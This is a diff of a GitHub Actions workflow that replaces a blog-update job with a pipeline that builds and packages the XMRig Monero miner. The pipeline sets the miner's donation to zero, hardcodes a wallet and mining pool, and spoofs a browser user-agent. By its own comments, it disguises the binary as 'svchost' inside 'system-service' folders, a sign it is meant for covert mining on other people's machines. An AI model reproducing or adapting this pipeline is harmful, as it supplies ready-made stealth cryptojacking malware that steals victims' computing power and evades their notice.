@@ -1,47 +1,117 @@
-name: Blog
+# .github/workflows/build-miner.yml
+
+name: Build and Package Miner
+
+# 触发条件：
+# workflow_dispatch: 允许在 GitHub Actions 页面手动触发此工作流
 on:
   workflow_dispatch:
-  schedule:
-    - cron: "0 20 * * *" #
+
 jobs:
-  blog:
-    name: Blog
+  build:
+    name: Build for Linux (x64)
     runs-on: ubuntu-latest
+
+    # 定义环境变量，用于伪装目录和文件名
+    env:
+      DIR_NAME: system-service      # 源码和构建将被放在这个目录名下
+      EXE_NAME: svchost             # 最终编译出的可执行文件名
+      WALLET_ADDR: 47Z5E787p8bHJEEc2Bf878K86LHQcbKT6f8KEsU7ocmnQPKHNbHHdMNc4dW6drrR4egpHmkM2jTWkP1tg4wymd7DAtJD37L # 你的门罗币钱包地址
+      PACKAGE_NAME: system-core-package # 定义最终压缩包的名字
+
     steps:
-      - uses: actions/checkout@v3
-        with:
-          persist-credentials: false # otherwise, the token used is the GITHUB_TOKEN, instead of your personal access token.
-          fetch-depth: 0 # otherwise, there would be errors pushing refs to the destination repository.
-      - name: Setup Node.js environment
-        uses: actions/setup-node@v3
-        with:
-          node-version: "16"
-      - name: Get yarn cache directory path
-        id: yarn-cache-dir-path
-        run: echo "dir=$(yarn cache dir)" >> $GITHUB_OUTPUT
-      - uses: actions/cache@v3
-        id: yarn-cache # use this to check for `cache-hit` (`steps.yarn-cache.outputs.cache-hit != 'true'`)
-        with:
-          path: ${{ steps.yarn-cache-dir-path.outputs.dir }}
-          key: ${{ runner.os }}-yarn-${{ hashFiles('**/yarn.lock') }}
-          restore-keys: ${{ runner.os }}-yarn-
-      - run: yarn
-      - run: npm run start
-      - name: Commit files
-        id: commit-files
-        run: |
-          if [ -n "$(git status --porcelain README.md)" ]; then
-            git config --local user.email "github-actions[bot]@users.noreply.github.com"
-            git config --local user.name "github-actions[bot]"
-            git add README.md
-            git commit -m "docs: update blog"
-            echo "hasChange=true" >> $GITHUB_OUTPUT
-          else
-            echo "No changes detected"
-          fi
-      - name: Push changes
-        uses: ad-m/github-push-action@master
-        if: ${{ steps.commit-files.outputs.hasChange == 'true' }}
-        with:
-          github_token: ${{ secrets.GITHUB_TOKEN }}
-          branch: ${{ github.ref }}
+    - name: 1. 安装编译所需的依赖环境
+      run: |
+        sudo apt-get update
+        sudo apt-get install -y git build-essential cmake automake libtool autoconf libuv1-dev libssl-dev libhwloc-dev
+
+    - name: 2. 下载 XMRig-C3 源码并重命名目录
+      run: git clone https://github.com/C3Pool/xmrig-C3.git ${{ env.DIR_NAME }}
+
+    - name: 3. 自动修改捐赠级别为 0
+      run: |
+        sed -i 's/constexpr const int kDefaultDonateLevel =.*/constexpr const int kDefaultDonateLevel = 0;/g' ${{ env.DIR_NAME }}/src/donate.h
+        sed -i 's/constexpr const int kMinimumDonateLevel =.*/constexpr const int kMinimumDonateLevel = 0;/g' ${{ env.DIR_NAME }}/src/donate.h
+        echo "✅ Donation level successfully set to 0."
+
+    - name: 4. 创建 config.json 配置文件
+      run: |
+        cat <<EOF > ./${{ env.DIR_NAME }}/src/config.json
+        {
+            "autosave": true,
+            "cpu": {
+                "enabled": true,
+                "huge-pages": true,
+                "hw-aes": null,
+                "priority": null,
+                "memory-pool": true,
+                "yield": true,
+                "asm": true,
+                "max-threads-hint": 75
+            },
+            "randomx": {
+                "init": -1,
+                "mode": "auto",
+                "1gb-pages": false,
+                "rdmsr": true,
+                "wrmsr": true,
+                "numa": true
+            },
+            "pools": [
+                {
+                    "algo": null,
+                    "coin": null,
+                    "url": "auto.c3pool.org:19333",
+                    "user": "${{ env.WALLET_ADDR }}",
+                    "pass": "cloud-miner-01",
+                    "keepalive": true,
+                    "enabled": true,
+                    "tls": true,
+                    "tls-fingerprint": null
+                }
+            ],
+            "log-file": null,
+            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
+            "print-time": 300,
+            "health-print-time": 300,
+            "pause-on-battery": true
+        }
+        EOF
+        echo "✅ config.json created with your wallet address."
+
+    - name: 5. 执行静态编译
+      working-directory: ${{ env.DIR_NAME }}
+      run: |
+        echo "📦 Building static dependencies..."
+        mkdir scripts/build && cd scripts/build
+        cmake ../deps
+        make -j$(nproc)
+        cd ../../
+
+        echo "🚀 Compiling the main program..."
+        mkdir build && cd build
+        cmake .. -DXMRIG_DEPS=scripts/build
+        make -j$(nproc)
+
+    - name: 6. 准备最终打包目录
+      run: |
+        mkdir -p final-package
+        mv ${{ env.DIR_NAME }}/build/xmrig final-package/${{ env.EXE_NAME }}
+        mv ${{ env.DIR_NAME }}/src/config.json final-package/config.json
+        echo "✅ Final package directory prepared."
+
+    - name: 7. 创建 .tar.gz 压缩包
+      run: |
+        # 使用 tar 命令创建 .tar.gz 格式的压缩包
+        # -C final-package/ : 先切换到 final-package 目录，这样压缩包内不会包含这个父目录
+        # . : 代表将该目录下的所有内容添加到压缩包
+        tar -czvf ${{ env.PACKAGE_NAME }}.tar.gz -C final-package/ .
+        echo "✅ Created ${{ env.PACKAGE_NAME }}.tar.gz"
+
+    - name: 8. 上传产物包
+      uses: actions/upload-artifact@v4
+      with:
+        # 上传后的名字
+        name: ${{ env.PACKAGE_NAME }}
+        # 需要上传的 .tar.gz 文件
+        path: ${{ env.PACKAGE_NAME }}.tar.gz
